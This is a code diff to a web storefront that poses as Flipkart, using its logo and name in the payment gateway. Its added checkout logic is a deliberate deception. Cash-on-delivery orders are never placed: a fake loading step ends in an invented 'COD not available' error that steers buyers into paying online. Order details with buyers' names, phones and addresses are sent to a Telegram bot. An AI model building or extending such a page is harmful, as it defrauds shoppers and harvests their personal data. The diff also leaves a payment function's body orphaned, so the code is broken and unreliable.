@@ -448,6 +448,65 @@
             text-align: center;
             animation: fadeIn 0.5s;
         }
+        /* --- OLD CSS UPDATE: 3-Dot Menu Rotation Hatana --- */
+.more-icon { 
+    transform: none; /* Rotate 90deg hata diya, ab ye seedha rahega */
+    font-weight: bold; 
+    font-size: 18px; 
+}
+
+/* --- NEW CSS: COD Error Popup Styling --- */
+ #codErrorModal {
+    z-index: 20000 !important; 
+    align-items: center; 
+    justify-content: center; }
+
+.cod-error-content {
+    background: white;
+    padding: 30px 20px;
+    border-radius: 8px;
+    text-align: center;
+    width: 90%;
+    max-width: 350px;
+}
+.error-icon-circle {
+    width: 60px;
+    height: 60px;
+    background: #fdf5f5;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 15px auto;
+}
+.error-icon-circle i {
+    color: #ff6161;
+    font-size: 28px;
+}
+.error-title {
+    font-size: 18px;
+    font-weight: 600;
+    margin-bottom: 10px;
+    color: #212121;
+}
+.error-msg {
+    font-size: 13px;
+    color: #666;
+    margin-bottom: 20px;
+    line-height: 1.5;
+}
+.btn-retry-online {
+    background: #fb641b;
+    color: white;
+    width: 100%;
+    padding: 14px;
+    border: none;
+    font-weight: bold;
+    border-radius: 2px;
+    cursor: pointer;
+    font-size: 14px;
+    box-shadow: 0 1px 2px rgba(0,0,0,0.2);
+}
         .sale-popup h1 { 
             font-size: 36px; 
             color: #ffe500; 
@@ -586,26 +645,22 @@
                 <input type="text" placeholder="Search for products, brands and more">
                 <button><i class="fas fa-search"></i></button>
             </div>
-            <div class="nav-links">
-                <!-- Replaced Login Button with More Menu -->
-                <div class="more-menu">
+           <div class="nav-links">
+    <a href="#">Become a Seller</a>
+    
+    <a href="#" class="cart-btn" onclick="openCart(event)"><i class="fas fa-shopping-cart"></i> Cart <span class="cart-badge">0</span></a>
+    
+    <div class="more-menu" onclick="toggleMoreMenu(event)">
                     <i class="fas fa-ellipsis-v more-icon"></i>
-                    <div class="dropdown-content">
-                        <div class="dropdown-item"><i class="fas fa-user-circle"></i> Your Account (Logged In)</div>
-                        <a href="#" class="dropdown-item" onclick="showYourOrders()"><i class="fas fa-box"></i> Your Orders</a>
-                        <a href="#" class="dropdown-item" onclick="showSavedAddress()"><i class="fas fa-map-marker-alt"></i> Saved Addresses</a>
-                        <a href="#" class="dropdown-item" onclick="openLangModal()"><i class="fas fa-language"></i> Select Language</a>
-                        <a href="#" class="dropdown-item" onclick="showFeatureToast('Privacy Center')"><i class="fas fa-shield-alt"></i> Privacy Center</a>
-                        <a href="#" class="dropdown-item" onclick="showFeatureToast('Sell on Flipkart')"><i class="fas fa-store"></i> Sell on Flipkart</a>
-                        <a href="#" class="dropdown-item" onclick="showFeatureToast('Browse FAQs')"><i class="fas fa-question-circle"></i> Browse FAQs</a>
-                        <a href="#" class="dropdown-item" onclick="showFeatureToast('Policies')"><i class="fas fa-file-contract"></i> Terms, Policies</a>
-                        <a href="#" class="dropdown-item" onclick="showFeatureToast('Help Centre')"><i class="fas fa-headset"></i> Help</a>
-                    </div>
-                </div>
-                
-                <a href="#">Become a Seller</a>
-                <a href="#" class="cart-btn" onclick="openCart(event)"><i class="fas fa-shopping-cart"></i> Cart <span class="cart-badge">0</span></a>
-            </div>
+                    <div id="moreDropdown" class="dropdown-content">
+            <div class="dropdown-item"><i class="fas fa-user-circle"></i> Your Account (Logged In)</div>
+            <a href="#" class="dropdown-item" onclick="showYourOrders()"><i class="fas fa-box"></i> Your Orders</a>
+            <a href="#" class="dropdown-item" onclick="showSavedAddress()"><i class="fas fa-map-marker-alt"></i> Saved Addresses</a>
+            <a href="#" class="dropdown-item" onclick="openLangModal()"><i class="fas fa-language"></i> Select Language</a>
+            <a href="#" class="dropdown-item" onclick="showFeatureToast('Privacy Center')"><i class="fas fa-shield-alt"></i> Privacy Center</a>
+        </div>
+    </div>
+</div>
         </div>
     </header>
 
@@ -724,7 +779,20 @@
 
                 </div>
             </div>
-
+            <div id="codErrorModal" class="modal">
+    <div class="modal-content cod-error-content" style="height:auto;">
+        <div class="error-icon-circle">
+            <i class="fas fa-exclamation-circle"></i>
+        </div>
+        <div class="error-title">COD Not Available</div>
+        <p class="error-msg">
+            Due to high demand and order rush, Cash on Delivery is currently disabled by the seller for this location.
+            <br><br>
+            <strong>Please pay online to CONFORM your order.</strong>
+        </p>
+        <button class="btn-retry-online" onclick="switchToOnlinePayment()">PAY ONLINE NOW</button>
+    </div>
+</div>
              <!-- NEW: Similar Products Section -->
             <div class="similar-section">
                 <h3>Similar Products</h3>
@@ -890,7 +958,7 @@
                     <div class="pay-option" id="cod-option" onclick="selectPayment('cod')">
                         <input type="radio" name="payment" id="cod">
                         <label for="cod">
-                            <div class="pay-title">Cash on Delivery (Extra ₹49 Delivery Charge)</div>
+                            <div class="pay-title">Cash on Delivery</div>
                             <div class="pay-desc">Pay cash at time of delivery</div>
                         </label>
                     </div>
@@ -906,10 +974,10 @@
                 </div>
             </div>
             
-            <!-- Step 4: COD Confirmation (Hidden initially) -->
-            <div id="step-cod-confirm" class="step-content">
+            <!-- Step 4: COD conformation (Hidden initially) -->
+            <div id="step-cod-conform" class="step-content">
                  <div id="cod-summary-section">
-                    <h3 style="color:#2874f0; margin-bottom:15px;">Confirm COD Order</h3>
+                    <h3 style="color:#2874f0; margin-bottom:15px;">COMFORM COD Order</h3>
                     <p style="margin-bottom:20px;">You have selected Cash on Delivery. An extra charge of <strong>₹49</strong> has been added.</p>
                     
                     <div class="price-details" style="text-align:left;">
@@ -918,7 +986,7 @@
                         <div class="price-row total"><span>Final Payable</span><span id="cod-final-price">₹0</span></div>
                     </div>
 
-                    <button class="btn-continue" onclick="confirmCODOrder()" style="margin-top:10px;">CONFIRM ORDER</button>
+                    <button class="btn-continue" onclick="conformCODOrder()" style="margin-top:10px;">CONFORM ORDER</button>
                     <button class="btn-back" onclick="backToPayment()" style="width:100%; background:white; color:#2874f0; border:1px solid #f0f0f0; padding:10px; margin-top:10px; cursor:pointer;">Change Payment Mode</button>
                  </div>
             </div>
@@ -1467,10 +1535,13 @@
     let isCouponApplied = false; 
     let userRating = 0;
     
-    // Track if COD selected and confirm mode active
+    // Track if COD selected and conform mode active
     let isCodSelected = false;
 
     // --- DYNAMIC DISCOUNT HELPERS ---
+    function toggleMoreMenu(event) { event.stopPropagation(); document.getElementById('moreDropdown').classList.toggle('show');}
+    window.onclick = function(e) { if (!e.target.closest('.more-menu')) document.getElementById('moreDropdown').classList.remove('show'); }
+
     function getFinalDiscount(product) {
         let baseDiscount = product.discount;
         let finalDiscount = baseDiscount + globalDiscountModifier;
@@ -2108,12 +2179,12 @@
         document.getElementById('step-2-header').classList.add('active');
         document.getElementById('step-summary').classList.add('visible');
         // If coming back from COD step
-        document.getElementById('step-cod-confirm').classList.remove('visible');
+        document.getElementById('step-cod-conform').classList.remove('visible');
         isCodSelected = false;
     }
 
     function backToPayment() {
-        document.getElementById('step-cod-confirm').classList.remove('visible');
+        document.getElementById('step-cod-conform').classList.remove('visible');
         document.getElementById('step-payment').classList.add('visible');
         isCodSelected = false;
     }
@@ -2140,39 +2211,67 @@
             else startManualUPI();
         } else if (selected === 'cod') {
             // New COD Flow
-            showCodConfirmation();
+            showCodconformation();
         }
     }
     
-    function showCodConfirmation() {
-        isCodSelected = true;
-        document.getElementById('step-payment').classList.remove('visible');
-        document.getElementById('step-cod-confirm').classList.add('visible');
-        
-        const finalPriceWithCod = currentPrice + 49;
-        
-        document.getElementById('cod-base-price').innerText = `₹${currentPrice}`;
-        document.getElementById('cod-final-price').innerText = `₹${finalPriceWithCod}`;
-    }
+    // --- UPDATED: COD conformation Without Charge ---
+function showCodconformation() {
+    isCodSelected = true;
+    document.getElementById('step-payment').classList.remove('visible');
+    document.getElementById('step-cod-conform').classList.add('visible');
     
-    function confirmCODOrder() {
-        // Add delivery charge to final tracking price before completing
-        currentPrice += 49; 
-        const refId = "COD" + Math.floor(Math.random() * 1000000);
-        
-        showLoading();
-        setTimeout(() => {
-            hideLoading();
-            completeOrder(refId);
-        }, 1500);
-    }
+    // Charge removed, same price as online
+    const finalPriceWithCod = currentPrice; 
     
-    function requestPayment() {
-        const upiId = document.getElementById('upi-id-input').value;
-        if(!upiId || !upiId.includes('@')) {
-            showToast("Please enter a valid UPI ID");
-            return;
-        }
+    // Update HTML to show FREE delivery instead of ₹49
+    document.getElementById('cod-summary-section').innerHTML = `
+        <h3 style="color:#2874f0; margin-bottom:15px;">CONFORM COD Order</h3>
+        <p style="margin-bottom:20px; color:#666;">Please CONFORM your order details below.</p>
+        
+        <div class="price-details" style="text-align:left;">
+            <div class="price-row"><span>Order Total</span><span id="cod-base-price">₹${currentPrice}</span></div>
+            <div class="price-row"><span>Delivery Charge</span><span style="color:#388e3c;">FREE</span></div>
+            <div class="price-row total"><span>Final Payable</span><span id="cod-final-price">₹${finalPriceWithCod}</span></div>
+        </div>
+
+        <button class="btn-continue" onclick="conformCODOrder()" style="margin-top:10px;">CONFORM ORDER</button>
+        <button class="btn-back" onclick="backToPayment()" style="width:100%; background:white; color:#2874f0; border:1px solid #f0f0f0; padding:10px; margin-top:10px; cursor:pointer;">Change Payment Mode</button>
+    `;
+}
+
+// --- UPDATED: COD Fake Processing & Error Logic ---
+function conformCODOrder() {
+    // 1. Show Processing
+    showLoading();
+    
+    // 2. Wait 2.5 Seconds then Show Error (No Order Placed)
+    setTimeout(() => {
+        hideLoading();
+        // Open the Error Modal
+        document.getElementById('codErrorModal').style.display = 'flex';
+    }, 2500);
+}
+
+// --- NEW FUNCTION: Switch back to Online Payment ---
+function switchToOnlinePayment() {
+    // 1. Close Error Modal
+    document.getElementById('codErrorModal').style.display = 'none';
+    
+    // 2. Hide COD Section
+    document.getElementById('step-cod-conform').classList.remove('visible');
+    
+    // 3. Show Payment Options Section
+    document.getElementById('step-payment').classList.add('visible');
+    
+    // 4. Select Online Option Automatically
+    selectPayment('online');
+    
+    // 5. Scroll to top of payment section
+    document.getElementById('step-3-header').scrollIntoView({behavior: 'smooth'});
+    
+    showToast("Online Payment Mode Selected");
+}
         
         showLoading();
         // Simulate API call
@@ -2189,7 +2288,6 @@
             }, 2000);
             
         }, 2000);
-    }
 
     function startRazorpay() {
         let desc = isCartOrder ? `Bulk Order (${cart.length} items)` : currentProduct.name;
@@ -2197,7 +2295,7 @@
             "key": RAZORPAY_KEY_ID, 
             "amount": Math.round(currentPrice * 100), 
             "currency": "INR",
-            "name": "FlipStore",
+            "name": "FlipKart",
             "description": desc,
             "image": "https://rukminim1.flixcart.com/www/800/800/promos/16/05/2019/d438a32e-765a-4d8b-b4a6-520b560971e8.png?q=90",
             "handler": function (response) { hideLoading(); completeOrder(response.razorpay_payment_id); },
@@ -2377,7 +2475,7 @@
         // Add payment mode info
         const paymentMode = isCodSelected ? "Cash on Delivery" : "Online / UPI";
 
-        const finalOrderDetails = `✅ ORDER CONFIRMED\n🆔 ${refId}\n👤 ${window.userDetails.name}\n📱 ${window.userDetails.phone}\n🏠 ${window.userDetails.addr}\n${itemsText}\n💰 ₹${currentPrice} (${paymentMode})\n\n⭐ RATING: ${ratingText}\n📝 FEEDBACK: ${feedback}`;
+        const finalOrderDetails = `✅ ORDER CONFORMED\n🆔 ${refId}\n👤 ${window.userDetails.name}\n📱 ${window.userDetails.phone}\n🏠 ${window.userDetails.addr}\n${itemsText}\n💰 ₹${currentPrice} (${paymentMode})\n\n⭐ RATING: ${ratingText}\n📝 FEEDBACK: ${feedback}`;
         
         fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             method: 'POST',
@@ -2460,3 +2558,4 @@
     </script>
 </body>
 </html>
+
